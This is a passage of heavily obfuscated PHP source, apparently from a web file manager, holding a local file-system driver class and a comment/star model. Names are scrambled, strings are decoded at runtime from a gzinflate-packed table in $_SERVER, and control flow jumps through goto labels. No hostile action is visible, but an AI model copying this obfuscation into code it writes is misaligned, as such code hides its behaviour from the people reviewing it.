2) == $_SERVER[´È¥ö†ö][1410]) { $óÔÍÙĞê = BASIC_PATH . substr($óÔÍÙĞê, 2); } return $óÔÍÙĞê; } public function iconvApp($ëßÎ½¦’) { $¼Ä÷­ =& $_SERVER[´È¥ö†ö]; global $config; return $this->iconvTo($ëßÎ½¦’, $config[$¼Ä÷­[1439]], $config[$¼Ä÷­[1438]]); } public function iconvSystem($‹¨÷Ç¾š) { $ôâ´Ù¸Ä =& $_SERVER[´È¥ö†ö]; global $config; return $this->iconvTo($‹¨÷Ç¾š, $config[$ôâ´Ù¸Ä[1438]], $config[$ôâ´Ù¸Ä[1439]]); } public function getPathOuter($…Æâûç) { $Õ‰šè—à =& $_SERVER[´È¥ö†ö]; $ÂóĞ¿®« = $this->iconvApp($this->pathBase); $…Æâûç = $this->iconvApp($…Æâûç); if (substr($ÂóĞ¿®«, 0, 2) == $Õ‰šè—à[1410]) { $ÂóĞ¿®« = BASIC_PATH . substr($ÂóĞ¿®«, 2); } if (substr($…Æâûç, 0, 2) == $Õ‰šè—à[1410]) { $…Æâûç = BASIC_PATH . substr($…Æâûç, 2); } $ÂóĞ¿®« = KodIO::clear($ÂóĞ¿®«); $…Æâûç = KodIO::clear($…Æâûç); $…Æâûç = substr($…Æâûç, strlen($ÂóĞ¿®«)); if (empty($this->pathDriver)) { return $…Æâûç; } return $this->pathDriver . $Õ‰šè—à[8] . ltrim($…Æâûç, $Õ‰šè—à[8]); } public function mkfile($”º¸Åò±, $Íˆ­ıÅâ = '', $ÁÇá“„â = REPEAT_RENAME) { $”º¸Åò± = $this->iconvSystem($”º¸Åò±); @touch($”º¸Åò±); if ($Íˆ­ıÅâ) { file_put_contents($”º¸Åò±, $Íˆ­ıÅâ); } @chmod($”º¸Åò±, $this->pathAuth); if (is_file($”º¸Åò±)) { return $this->getPathOuter($”º¸Åò±); } $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } public function mkdir($¤íúµÀ, $ÚËƒ¯Å¼ = REPEAT_SKIP) { $¤íúµÀ = $this->iconvSystem($¤íúµÀ); if (is_dir($¤íúµÀ)) { return $this->getPathOuter($¤íúµÀ); } @mkdir($¤íúµÀ, $this->pathAuth, !0); @chmod($¤íúµÀ, $this->pathAuth); if (is_dir($¤íúµÀ)) { return $this->getPathOuter($¤íúµÀ); } $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } public function copyFile($ÓúÖÑ†·, $˜ ûÇ¶) { $this->mkdir($this->pathFather($˜ ûÇ¶)); $ÓúÖÑ†· = $this->iconvSystem($ÓúÖÑ†·); $˜ ûÇ¶ = $this->iconvSystem($˜ ûÇ¶); $±Êïò›â = copy_64($ÓúÖÑ†·, $˜ ûÇ¶); @chmod($˜ ûÇ¶, $this->pathAuth); if ($±Êïò›â) { return $this->getPathOuter($˜ ûÇ¶); } $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } public function moveFile($é½¡æ”ƒ, $ÜâÁÜè×) { $this->mkdir($this->pathFather($ÜâÁÜè×)); $é½¡æ”ƒ = $this->iconvSystem($é½¡æ”ƒ); $ÜâÁÜè× = $this->iconvSystem($ÜâÁÜè×); $ƒ¤Üä’” = intval(@rename($é½¡æ”ƒ, $ÜâÁÜè×)); if (!$ƒ¤Üä’”) { if ($ƒ¤Üä’” = intval(@copy_64($é½¡æ”ƒ, $ÜâÁÜè×))) { @unlink($é½¡æ”ƒ); } } @chmod($ÜâÁÜè×, $this->pathAuth); if ($ƒ¤Üä’”) { return $this->getPathOuter($ÜâÁÜè×); } $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } public function movePath($ø¼®ğ©˜, $ä°Ñ¤ÁÆ, $äê²‰Öª = false) { $ó­ö» =& $_SERVER[´È¥ö†ö]; $ø¼®ğ©˜ = $this->iconvSystem($ø¼®ğ©˜); $ä°Ñ¤ÁÆ = $this->iconvSystem($ä°Ñ¤ÁÆ); $ˆ”±ªÖé = rtrim($ä°Ñ¤ÁÆ, $ó­ö»[8]) . $ó­ö»[8] . ($äê²‰Öª ? $äê²‰Öª : get_path_this($ø¼®ğ©˜)); if (file_exists($ˆ”±ªÖé)) { return !1; } $ùŞ‘’á² = intval(@rename($ø¼®ğ©˜, $ˆ”±ªÖé)); $ùŞ‘’á² = file_exists($ˆ”±ªÖé); if ($ùŞ‘’á²) { return $this->getPathOuter($ˆ”±ªÖé); } $this->writeLog(__FUNCTION__ . $ó­ö»[1450], !0); return !1; } public function delFile($­´îõ‚) { $­´îõ‚ = $this->iconvSystem($­´îõ‚); if (!@unlink($­´îõ‚)) { @chmod($­´îõ‚, $this->pathAuth); if (@unlink($­´îõ‚)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } return !0; } public function delFolder($ç ÷Êä¥) { $Åí¤İ« =& $_SERVER[´È¥ö†ö]; $ç ÷Êä¥ = $this->iconvSystem($ç ÷Êä¥); if (!is_dir($ç ÷Êä¥)) { return !0; } if (!($é¨šİÖ = opendir($ç ÷Êä¥))) { return !1; } while (($’´îôöä = readdir($é¨šİÖ)) !== !1) { if ($’´îôöä == $Åí¤İ«[10] || $’´îôöä == $Åí¤İ«[1362]) { continue; } $™×ØÃÅé = $ç ÷Êä¥ . $Åí¤İ«[8] . $’´îôöä; if (is_file($™×ØÃÅé) || is_link($™×ØÃÅé)) { if (!unlink($™×ØÃÅé)) { chmod($™×ØÃÅé, $this->pathAuth); if (!unlink($™×ØÃÅé)) { return !1; } } } else { if (is_dir($™×ØÃÅé)) { chmod($™×ØÃÅé, $this->pathAuth); $™×ØÃÅé = $this->iconvApp($™×ØÃÅé); if (!$this->delFolder($™×ØÃÅé)) { return !1; } } } } closedir($é¨šİÖ); return rmdir($ç ÷Êä¥); } public function rename($øëïí»À, $Ğ­ÙˆŒÛ) { $¬˜øå”è =& $_SERVER[´È¥ö†ö]; $èğ€†÷Â = $this->fileNameAuto($this->pathFather($øëïí»À), $Ğ­ÙˆŒÛ); $èğ€†÷Â = $this->iconvSystem($èğ€†÷Â); $øëïí»À = $this->iconvSystem($øëïí»À); $ñÓ«ı¸Ê = $this->pathFather($øëïí»À); $¨›®ŒÎó = rtrim($ñÓ«ı¸Ê, $¬˜øå”è[8]) . $¬˜øå”è[8] . $èğ€†÷Â; $ºÀ¿Œ  = @rename($øëïí»À, $¨›®ŒÎó); $¨›®ŒÎó = $this->iconvApp($¨›®ŒÎó); if ($ºÀ¿Œ ) { return $this->getPathOuter($¨›®ŒÎó); } $this->writeLog(__FUNCTION__ . $¬˜øå”è[1450], !0); return !1; } public function size($ÀÂ„Íºû) { $ÀÂ„Íºû = $this->iconvSystem($ÀÂ„Íºû); return filesize_64($ÀÂ„Íºû); } public function info($“èè–«Æ) { $“èè–«Æ = $this->iconvSystem($“èè–«Æ); if ($this->isFolder($“èè–«Æ)) { return $this->folderInfo($“èè–«Æ); } else { if ($this->isFile($“èè–«Æ)) { return $this->fileInfo($“èè–«Æ); } } return !1; } protected function infoChildren($± ¶¼ĞŒ, &$ãÈä«¤, $Òä“ŞÔ¼ = true) { $ıåË˜â =& $_SERVER[´È¥ö†ö]; check_abort_echo(); $± ¶¼ĞŒ = rtrim($± ¶¼ĞŒ, $ıåË˜â[8]) . $ıåË˜â[8]; if ($Òä“ŞÔ¼) { $± ¶¼ĞŒ = $this->iconvSystem($± ¶¼ĞŒ); } if (!($¨Ğı”Åë = @opendir($± ¶¼ĞŒ))) { return; } while (($Ğ÷Ûªâ = readdir($¨Ğı”Åë)) !== !1) { if ($Ğ÷Ûªâ == $ıåË˜â[10] || $Ğ÷Ûªâ == $ıåË˜â[1362]) { continue; } $¦¿Ãà©ü = $± ¶¼ĞŒ . $Ğ÷Ûªâ; if (is_file($¦¿Ãà©ü) || is_link($¦¿Ãà©ü)) { $ãÈä«¤[$ıåË˜â[80]]++; $ãÈä«¤[$ıåË˜â[79]] += filesize_64($¦¿Ãà©ü); } else { if (is_dir($¦¿Ãà©ü)) { $ãÈä«¤[$ıåË˜â[81]]++; $this->infoChildren($¦¿Ãà©ü, $ãÈä«¤, !1); } } } closedir($¨Ğı”Åë); } private function folderInfo($š´À¶¬Ğ, $õ§àù ” = false) { $¿Í†œ‹ =& $_SERVER[´È¥ö†ö]; $š´À¶¬Ğ = rtrim($š´À¶¬Ğ, $¿Í†œ‹[8]) . $¿Í†œ‹[8]; $±ÕåÑó“ = $this->iconvApp($this->pathThis($š´À¶¬Ğ)); if ($õ§àù ”) { return array($¿Í†œ‹[32] => $±ÕåÑó“, $¿Í†œ‹[87] => $this->getPathOuter($š´À¶¬Ğ), $¿Í†œ‹[33] => $¿Í†œ‹[78]); } $û¦µŸŞñ = array($¿Í†œ‹[32] => $±ÕåÑó“, $¿Í†œ‹[87] => $this->getPathOuter($š´À¶¬Ğ), $¿Í†œ‹[33] => $¿Í†œ‹[78], $¿Í†œ‹[233] => @filectime($š´À¶¬Ğ), $¿Í†œ‹[88] => @filemtime($š´À¶¬Ğ), $¿Í†œ‹[1454] => @fileatime($š´À¶¬Ğ), $¿Í†œ‹[1455] => is_readable($š´À¶¬Ğ), $¿Í†œ‹[1456] => is_writable($š´À¶¬Ğ), $¿Í†œ‹[1457] => get_mode($š´À¶¬Ğ)); return $û¦µŸŞñ; } private function fileInfo($–µÓ¦Ûç, $ôä«–œú = false) { $óç—–É½ =& $_SERVER[´È¥ö†ö]; $Ô”Â÷ ´ = $this->iconvApp($this->pathThis($–µÓ¦Ûç)); if ($ôä«–œú) { return array($óç—–É½[32] => $Ô”Â÷ ´, $óç—–É½[87] => $this->getPathOuter($–µÓ¦Ûç), $óç—–É½[33] => $óç—–É½[232], $óç—–É½[79] => $this->size($–µÓ¦Ûç), $óç—–É½[169] => $this->ext($Ô”Â÷ ´)); } $ú™š—ÕÁ = array($óç—–É½[32] => $Ô”Â÷ ´, $óç—–É½[87] => $this->getPathOuter($–µÓ¦Ûç), $óç—–É½[33] => $óç—–É½[232], $óç—–É½[233] => @filectime($–µÓ¦Ûç), $óç—–É½[88] => @filemtime($–µÓ¦Ûç), $óç—–É½[1454] => @fileatime($–µÓ¦Ûç), $óç—–É½[79] => $this->size($–µÓ¦Ûç), $óç—–É½[169] => $this->ext($Ô”Â÷ ´), $óç—–É½[1455] => is_readable($–µÓ¦Ûç), $óç—–É½[1456] => is_writable($–µÓ¦Ûç), $óç—–É½[1457] => get_mode($–µÓ¦Ûç)); return $ú™š—ÕÁ; } public function exist($×Ç«İ„€) { $×Ç«İ„€ = $this->iconvSystem($×Ç«İ„€); return @file_exists($×Ç«İ„€); } public function isFile($ÉÒ¯¸¬¼) { $ÉÒ¯¸¬¼ = $this->iconvSystem($ÉÒ¯¸¬¼); return @is_file($ÉÒ¯¸¬¼); } public function isFolder($Íùşñ¡²) { $Íùşñ¡² = $this->iconvSystem($Íùşñ¡²); return @is_dir($Íùşñ¡²); } public function listPath($Òæ‹ıôº, $ö€–Ë¿Ô = false) { $Ô¿´Ùğ‹ =& $_SERVER[´È¥ö†ö]; $Òæ‹ıôº = $this->iconvSystem($Òæ‹ıôº); $Òæ‹ıôº = rtrim($Òæ‹ıôº, $Ô¿´Ùğ‹[8]) . $Ô¿´Ùğ‹[8]; $Í€‚°ßÂ = array($Ô¿´Ùğ‹[85] => array(), $Ô¿´Ùğ‹[86] => array()); if (!($æàí = @opendir($Òæ‹ıôº))) { return $Í€‚°ßÂ; } while (($¼ËÁ›Á© = readdir($æàí)) !== !1) { if ($¼ËÁ›Á© == $Ô¿´Ùğ‹[10] || $¼ËÁ›Á© == $Ô¿´Ùğ‹[1362]) { continue; } $ïõ²¾¨¢ = $Òæ‹ıôº . $¼ËÁ›Á©; if (is_file($ïõ²¾¨¢)) { $Í€‚°ßÂ[$Ô¿´Ùğ‹[86]][] = $this->fileInfo($ïõ²¾¨¢, $ö€–Ë¿Ô); } else { $Í€‚°ßÂ[$Ô¿´Ùğ‹[85]][] = $this->folderInfo($ïõ²¾¨¢, $ö€–Ë¿Ô); } } closedir($æàí); return $Í€‚°ßÂ; } public function listAll($˜ĞîÃÚö, &$İÌÊ¹Ï = array()) { $í£¤Ì¸ =& $_SERVER[´È¥ö†ö]; $˜ĞîÃÚö = $this->iconvSystem($˜ĞîÃÚö); $˜ĞîÃÚö = rtrim($˜ĞîÃÚö, $í£¤Ì¸[8]) . $í£¤Ì¸[8]; if (!($Û¤ÍË‰³ = @opendir($˜ĞîÃÚö))) { return $İÌÊ¹Ï; } while (($´Èöº«İ = readdir($Û¤ÍË‰³)) !== !1) { if ($´Èöº«İ == $í£¤Ì¸[10] || $´Èöº«İ == $í£¤Ì¸[1362]) { continue; } $ìóœø³ = $˜ĞîÃÚö . $´Èöº«İ; $–ôÁî©Ù = is_dir($ìóœø³) && !is_link($ìóœø³) ? 1 : 0; $ìóœø³ = $–ôÁî©Ù ? $ìóœø³ . $í£¤Ì¸[8] : $ìóœø³; $İÌÊ¹Ï[] = array($í£¤Ì¸[87] => $ìóœø³, $í£¤Ì¸[78] => $–ôÁî©Ù, $í£¤Ì¸[88] => intval(@filemtime($ìóœø³)), $í£¤Ì¸[79] => $–ôÁî©Ù ? 0 : intval($this->size($ìóœø³))); if ($–ôÁî©Ù) { $this->listAll($ìóœø³, $İÌÊ¹Ï); } } closedir($Û¤ÍË‰³); return $İÌÊ¹Ï; } public function has($ØË­”Æè, $¸‰æ¿ò­ = false, $¤¶‡ïã• = true) { $‡µûİß« =& $_SERVER[´È¥ö†ö]; $ØË­”Æè = $this->iconvSystem($ØË­”Æè); $ØË­”Æè = rtrim($ØË­”Æè, $‡µûİß«[8]) . $‡µûİß«[8]; if (!($Î²©‚ı³ = @opendir($ØË­”Æè))) { return !1; } $†Ì¨Œ¡™ = 0; $˜Âúİã = 0; $Ö¼½ô½À = 0; while (($®÷¤ÍË = readdir($Î²©‚ı³)) !== !1) { if ($®÷¤ÍË == $‡µûİß«[10] || $®÷¤ÍË == $‡µûİß«[1362]) { continue; } $”‚ìµ¦ = $ØË­”Æè . $®÷¤ÍË; if ($¸‰æ¿ò­) { $Ö¼½ô½À++; if (@is_file($”‚ìµ¦)) { $†Ì¨Œ¡™++; } else { $˜Âúİã++; } if ($Ö¼½ô½À > 10000) { break; } continue; } if ($¤¶‡ïã•) { if (@is_file($”‚ìµ¦)) { return !0; } } else { if (@is_dir($”‚ìµ¦ . $‡µûİß«[8])) { return !0; } } } closedir($Î²©‚ı³); if ($¸‰æ¿ò­) { return array($‡µûİß«[241] => $†Ì¨Œ¡™, $‡µûİß«[242] => $˜Âúİã); } return !1; } public function hashSimple($´éı¶¿Ê) { $¾­ùï½ç =& $_SERVER[´È¥ö†ö]; if (!$´éı¶¿Ê) { return md5($¾­ùï½ç[12]); } $´éı¶¿Ê = $this->iconvSystem($´éı¶¿Ê); $ıæãî Û = $this->size($´éı¶¿Ê); $¨‘ÆèéÊ = 200; $Ì•ÒÊôş = 50; if ($ıæãî Û <= $¨‘ÆèéÊ * $Ì•ÒÊôş) { return $this->hashMd5($´éı¶¿Ê) . $ıæãî Û; } $Ôôã¬å = $¾­ùï½ç[12]; $Ò‡¼´«Ê = intval($ıæãî Û / $Ì•ÒÊôş); $é¡Ì‹ ª = fopen($´éı¶¿Ê, $¾­ùï½ç[1458]); if (!$é¡Ì‹ ª) { return $Ôôã¬å; } for ($Ñ»²ºÒò = 0; $Ñ»²ºÒò < $Ì•ÒÊôş; $Ñ»²ºÒò++) { fseek_64($é¡Ì‹ ª, $Ò‡¼´«Ê * $Ñ»²ºÒò); $Ôôã¬å .= fread($é¡Ì‹ ª, $¨‘ÆèéÊ); } fseek_64($é¡Ì‹ ª, $ıæãî Û - $¨‘ÆèéÊ); $Ôôã¬å .= fread($é¡Ì‹ ª, $¨‘ÆèéÊ); fclose($é¡Ì‹ ª); return md5($Ôôã¬å) . $ıæãî Û; } public function getContent($ÙÛÏ¥”˜) { $ÙÛÏ¥”˜ = $this->iconvSystem($ÙÛÏ¥”˜); return file_get_contents($ÙÛÏ¥”˜); } public function setContent($ÈÎÂàà¥, $ê”ó¹­² = '') { $ÈÎÂàà¥ = $this->iconvSystem($ÈÎÂàà¥); $ÒäàóüÑ = @file_put_contents($ÈÎÂàà¥, $ê”ó¹­², LOCK_EX); if (!$ÒäàóüÑ) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); } clearstatcache(); @chmod($ÈÎÂàà¥, $this->pathAuth); return $ÒäàóüÑ === !1 ? !1 : !0; } public function fileSubstr($¸ÇæÇÇ·, $”á™¤¿ş = 0, $‰ó¬‡–Å = false) { $ßå­Å°á =& $_SERVER[´È¥ö†ö]; $¸ÇæÇÇ· = $this->iconvSystem($¸ÇæÇÇ·); if ($‰ó¬‡–Å === !1) { $‰ó¬‡–Å = $this->size($¸ÇæÇÇ·); } if ($‰ó¬‡–Å <= 0) { return $ßå­Å°á[12]; } $¾Ù´†ãŞ = fopen($¸ÇæÇÇ·, $ßå­Å°á[1458]); if (!$¾Ù´†ãŞ) { return !1; } fseek_64($¾Ù´†ãŞ, $”á™¤¿ş); $£¢Ìˆ¤Ü = fread($¾Ù´†ãŞ, $‰ó¬‡–Å); fclose($¾Ù´†ãŞ); if (!$£¢Ìˆ¤Ü) { $this->writeLog(__FUNCTION__ . $ßå­Å°á[1450], !0); } return $£¢Ìˆ¤Ü; } public function upload($õñ×Ÿ‚, $ÙŞÈÕğô, $ü¼Ó ’ = false, $‰É˜ú™ë = REPEAT_REPLACE) { if ($ü¼Ó ’) { return $this->moveFile($ÙŞÈÕğô, $õñ×Ÿ‚); } return $this->copyFile($ÙŞÈÕğô, $õñ×Ÿ‚); } public function setModifyTime($ìñ¼‡—ã, $ÊãÎé = '') { @touch($ìñ¼‡—ã, intval($ÊãÎé)); } public function download($•ğõœ­, $ÔŸÇòÎ») { return $this->iconvSystem($•ğõœ­); } } goto C¸¾«Å­Ñ; Eğ„À›™«È: define($_SERVER[´È¥ö†ö][0], $_SERVER[´È¥ö†ö][1]); $_SERVER[¾ Æ·á£] = explode($_SERVER[´È¥ö†ö][2], gzinflate(substr($_SERVER[´È¥ö†ö][3], 10, -8))); function binCheckEq($ŞÍ±Ìº­, $ÌŞãÛÖø) { return $ŞÍ±Ìº­ == $ÌŞãÛÖø; } goto E×¦Æ“İÇæ; C’š¢ÒÆ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\156\164"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\x6d\x65" => "\x63\x6f\x6d\155\145\156\164\137\155\145\x74\x61", "\155\145\x74\141\x46\x69\145\x6c\x64" => "\143\x6f\x6d\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($„»øšÅ…) { $«Ä€ıÏ =& $_SERVER[´È¥ö†ö]; if ($„»øšÅ…[$«Ä€ıÏ[2003]]) { $ÖÆëÑâ¶ = $this->where(array($«Ä€ıÏ[2004] => $„»øšÅ…[$«Ä€ıÏ[2003]]))->find(); if (!$ÖÆëÑâ¶ || $ÖÆëÑâ¶[$«Ä€ıÏ[190]] != $„»øšÅ…[$«Ä€ıÏ[190]] || $ÖÆëÑâ¶[$«Ä€ıÏ[580]] != $„»øšÅ…[$«Ä€ıÏ[580]]) { return !1; } $this->where(array($«Ä€ıÏ[2004] => $„»øšÅ…[$«Ä€ıÏ[2003]]))->setAdd($«Ä€ıÏ[2005], 1); } $„»øšÅ…[$«Ä€ıÏ[2006]] = 0; $„»øšÅ…[$«Ä€ıÏ[2005]] = 0; $„»øšÅ…[$«Ä€ıÏ[826]] = 1; return $this->add($„»øšÅ…); } public function commentCount($ŒéøÜÂ±, $ŒñÅ²ş, $À‡×é•ë = false) { $ˆÏí”Îñ =& $_SERVER[´È¥ö†ö]; if (!$ŒéøÜÂ±) { return array(); } if (is_string($ŒéøÜÂ±) || is_int($ŒéøÜÂ±)) { $ŒéøÜÂ± = array($ŒéøÜÂ±); } $†íÏÒ·Ì = array($ˆÏí”Îñ[580], $ˆÏí”Îñ[2007] => $ˆÏí”Îñ[576]); $Óï§ò¶© = array($ˆÏí”Îñ[580] => array($ˆÏí”Îñ[7], $ŒéøÜÂ±), $ˆÏí”Îñ[190] => $ŒñÅ²ş); if ($À‡×é•ë) { $Óï§ò¶©[$ˆÏí”Îñ[1773]] = $À‡×é•ë; } $ƒà†Çµ = $this->field($†íÏÒ·Ì)->where($Óï§ò¶©)->group($ˆÏí”Îñ[580])->select(); return array_to_keyvalue($ƒà†Çµ, $ˆÏí”Îñ[580], $ˆÏí”Îñ[576]); } public function starTarget($”ƒ¹æ»È, $íƒ‹Îîø) { $§¡üŒ˜ª =& $_SERVER[´È¥ö†ö]; $€Ø¸•Ÿù = $”ƒ¹æ»È + self::TYPE_STAR_OFFSET; $‹ŠÜ„ôÜ = array($§¡üŒ˜ª[1773] => USER_ID, $§¡üŒ˜ª[190] => $€Ø¸•Ÿù, $§¡üŒ˜ª[580] => $íƒ‹Îîø); $×“îº­ = $this->where($‹ŠÜ„ôÜ)->find(); if ($×“îº­) { return $this->where(array($§¡üŒ˜ª[486] => $×“îº­[$§¡üŒ˜ª[486]]))->delete(); } $ª­çã›ö = array($§¡üŒ˜ª[2003] => 0, $§¡üŒ˜ª[1773] => USER_ID, $§¡üŒ˜ª[826] => 1, $§¡üŒ˜ª[171] => $§¡üŒ˜ª[12], $§¡üŒ˜ª[190] => $€Ø¸•Ÿù, $§¡üŒ˜ª[580] => $íƒ‹Îîø, $§¡üŒ˜ª[2006] => 0, $§¡üŒ˜ª[2005] => 0); return $this->add($ª­çã›ö); } public function starTargetCount($ºíİù†Ç, $à÷Ğ»Òº) { $‡à©£Í =& $_SERVER[´È¥ö†ö]; $‚ ­øîÛ = $à÷Ğ»Òº + self::TYPE_STAR_OFFSET; $€ò¯¡ä = $this->commentCount($ºíİù†Ç, $‚ ­øîÛ); $îÕ˜ò¸œ = $this->commentCount($ºíİù†Ç, $‚ ­øîÛ, USER_ID); return array($‡à©£Í[2008] => $€ò¯¡ä, $‡à©£Í[2009] => $îÕ˜ò¸œ); } public function starTargetUserList($Â×î–†÷, $ÎŸœüí²) { $çû¤ Šã =& $_SERVER[´È¥ö†ö]; $ºÖš”¬ø = $Â×î–†÷ + self::TYPE_STAR_OFFSET; $İ¦“¹ = array($çû¤ Šã[580] => $ÎŸœüí², $çû¤ Šã[190] => $ºÖš”¬ø); $¼ÌÉ€ÆÑ = $this->where($İ¦“¹)->count(); $ø ¬¥Ù¶ = array($çû¤ Šã[343] => $¼ÌÉ€ÆÑ, $çû¤ Šã[2010] => array()); if (!$¼ÌÉ€ÆÑ) { return $ø ¬¥Ù¶; } $Ê‡®†Ëá = $this->field($çû¤ Šã[1773])->where($İ¦“¹)->limit(500)->select(); $Ê‡®†Ëá = array_to_keyvalue($Ê‡®†Ëá, $çû¤ Šã[12], $çû¤ Šã[1773]); $ø ¬¥Ù¶[$çû¤ Šã[2010]] = Model($çû¤ Šã[588])->userListInfo($Ê‡®†Ëá); return $ø ¬¥Ù¶; } public function prasiseUserList($öµ¿õ·) { $¿ÄÛ±§» =& $_SERVER[´È¥ö†ö]; $İ¦Îë…Ù = array($¿ÄÛ±§»[2011] => $öµ¿õ·); $¥ª‹ü“Õ = $this->where($İ¦Îë…Ù)->find(); $ùôˆ˜üÒ = _get($¥ª‹ü“Õ, $¿ÄÛ±§»[2006], 0); $ÙÔ§‘¢ì = array($¿ÄÛ±§»[343] => $ùôˆ˜üÒ, $¿ÄÛ±§»[2010] => array()); if (!$ùôˆ˜üÒ) { return $ÙÔ§‘¢ì; } $ÎíŞ‹Ö“ = Model($¿ÄÛ±§»[2012])->field($¿ÄÛ±§»[1773])->where($İ¦Îë…Ù)->limit(500)->select(); $ÎíŞ‹Ö“ = array_to_keyvalue($ÎíŞ‹Ö“, $¿ÄÛ±§»[12], $¿ÄÛ±§»[1773]); $ÙÔ§‘¢ì[$¿ÄÛ±§»[2010]] = Model($¿ÄÛ±§»[588])->userListInfo($ÎíŞ‹Ö“); return $ÙÔ§‘¢ì; } public function remove($†Á‡’¿) { $¢¨î¤²Å =& $_SERVER[´È¥ö†ö]; $¸Ö¦î­• = array($¢¨î¤²Å[2004] => $†Á‡’¿); $áÏ½ÃŒõ = $this->where($¸Ö¦î­•)->find(); if ($áÏ½ÃŒõ[$¢¨î¤²Å[2003]]) { $this->where(array($¢¨î¤²Å[2004] => $áÏ½ÃŒõ[$¢¨î¤²Å[2003]]))->setAdd($¢¨î¤²Å[2005], -1); } return $this->where($¸Ö¦î­•)->delete(); } public function edit($ŸÁ¢“‘†, $ú™¾íâ“) { $ïÇ™¿ù =& $_SERVER[´È¥ö†ö]; $ôÚÔ‹î‰ = array($ïÇ™¿ù[2004] => $ŸÁ¢“‘†); return $this->where($ôÚÔ‹î‰)->save(array($ïÇ™¿ù[2013] => $ú™¾íâ“)); } public function prasise($¤¥©µ¹ö) { $ãÍŒ“ =& $_SERVER[´È¥ö†ö]; $àÎ’úàê = Model($ãÍŒ“[2014]); $ÔäÎÎ×Ğ = array($ãÍŒ“[2004] => $¤¥©µ¹ö, $ãÍŒ“[1764] => USER_ID); $‡í£¶óé = $àÎ’úàê->where($ÔäÎÎ×Ğ)->find(); if (!$‡í£¶óé) { $àÎ’úàê->add($ÔäÎÎ×Ğ); $™üÓ™Á¾ = $this->where(array($ãÍŒ“[2004] => $¤¥©µ¹ö))->setAdd($ãÍŒ“[2006], 1); } else { $àÎ’úàê->where($ÔäÎÎ×Ğ)->delete(); $™üÓ™Á¾ = $this->where(array($ãÍŒ“[2004] => $¤¥©µ¹ö))->setAdd($ãÍŒ“[2006], -1); } return $™üÓ™Á¾; } public function targetInfo($îş“ÏÔÒ, $ÇÍÒ„æı) { $ ôîñçÂ =& $_SERVER[´È¥ö†ö]; $˜î–¨•Ø = array($ ôîñçÂ[662] => $îş“ÏÔÒ, $ ôîñçÂ[663] => $ÇÍÒ„æı); $ŠŒŸÄ½å = $this->where($˜î–¨•Ø)->count(); $ÑÃ†×‚ê = "\122\x49\107\110\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\x6e\164\x5f\x70\162\x61\x69\x73\x65\x20\163\164\141\162\x20\157\x6e\x20\x63\157\x6d\x6d\x65\156\x74\x2e\143\157\155\155\x65\156\164\111\x44\x20\75\x20\x73\164\x61\162\x2e\143\x6f\x6d\x6d\x65\x6e\x74\x49\x44"; $¢ûõıÈÅ = $this->alias($ ôîñçÂ[440])->where($˜î–¨•Ø)->join($ÑÃ†×‚ê, $ ôîñçÂ[2015])->count(); $ú²ÂØ„¿ = array($ ôîñçÂ[2016] => $ŠŒŸÄ½å, $ ôîñçÂ[2017] => $¢ûõıÈÅ); return $ú²ÂØ„¿; } public function listData($üš’í) { $À·Ÿõì± =& $_SERVER[´È¥ö†ö]; if (isset($üš’í[$À·Ÿõì±[2018]])) { if ($üš’í[$À·Ÿõì±[2018]]) { $üš’í[$À·Ÿõì±[2011]] = array($À·Ÿõì±[1090], intval($üš’í[$À·Ÿõì±[2018]])); } unset($üš’í[$À·Ÿõì±[2018]]); } if (isset($üš’í[$À·Ÿõì±[2019]])) { if ($üš’í[$À·Ÿõì±[2019]]) { $üš’í[$À·Ÿõì±[2011]] = array($À·Ÿõì±[1087], intval($üš’í[$À·Ÿõì±[2019]])); } unset($üš’í[$À·Ÿõì±[2019]]); } return $this->_listData($üš’í); } private function _listData($õ´§è¬ù) { $øÜ”ˆÉ =& $_SERVER[´È¥ö†ö]; $·ŠÀ±ÔÊ = $this->where($õ´§è¬ù)->_makeOrder()->selectPage(100); $this->_listAppendParent($·ŠÀ±ÔÊ[$øÜ”ˆÉ[456]]); $this->_listAppendUser($·ŠÀ±ÔÊ[$øÜ”ˆÉ[456]]); $this->_listAppendMeta($·ŠÀ±ÔÊ[$øÜ”ˆÉ[456]]); return $·ŠÀ±ÔÊ; } private function _makeOrder() { $İ ‹Æ¶® =& $_SERVER[´È¥ö†ö]; $ôƒí˜ğ¨ = array($İ ‹Æ¶®[2006], $İ ‹Æ¶®[2005], $İ ‹Æ¶®[233]); $¿¾ƒöĞ‰ = Input::get($İ ‹Æ¶®[541], $İ ‹Æ¶®[7], $İ ‹Æ¶®[508], $ôƒí˜ğ¨); $ƒèÏäŠ¥ = Input::get($İ ‹Æ¶®[542], $İ ‹Æ¶®[7], $İ ‹Æ¶®[1766], array($İ ‹Æ¶®[2020], $İ ‹Æ¶®[537])); $ï£‡ü• = $¿¾ƒöĞ‰ . $İ ‹Æ¶®[53] . $ƒèÏäŠ¥; return $this->order($ï£‡ü•); } private function _listAppendParent(&$Î¿™·œ›) { $‚‰¬£¡‡ =& $_SERVER[´È¥ö†ö]; $‚‘º§ĞÓ = array_unique(array_to_keyvalue($Î¿™·œ›, $‚‰¬£¡‡[12], $‚‰¬£¡‡[2003])); $‚‘º§ĞÓ = array_remove_value($‚‘º§ĞÓ, $‚‰¬£¡‡[230]); if (!$‚‘º§ĞÓ) { return; } $ø±¸êÊÏ = $this->where(array($‚‰¬£¡‡[2004] => array($‚‰¬£¡‡[7], $‚‘º§ĞÓ)))->select(); $ø±¸êÊÏ = array_to_keyvalue($ø±¸êÊÏ, $‚‰¬£¡‡[2011]); foreach ($Î¿™·œ› as &$Á·¢æµ) { if 